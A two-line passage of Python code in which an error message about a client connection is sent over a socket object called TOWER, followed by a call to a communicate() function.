			TOWER.send(str.encode(ERROR+'Client connection error: '+str(cli_Err)+'\n'))	

communicate()		

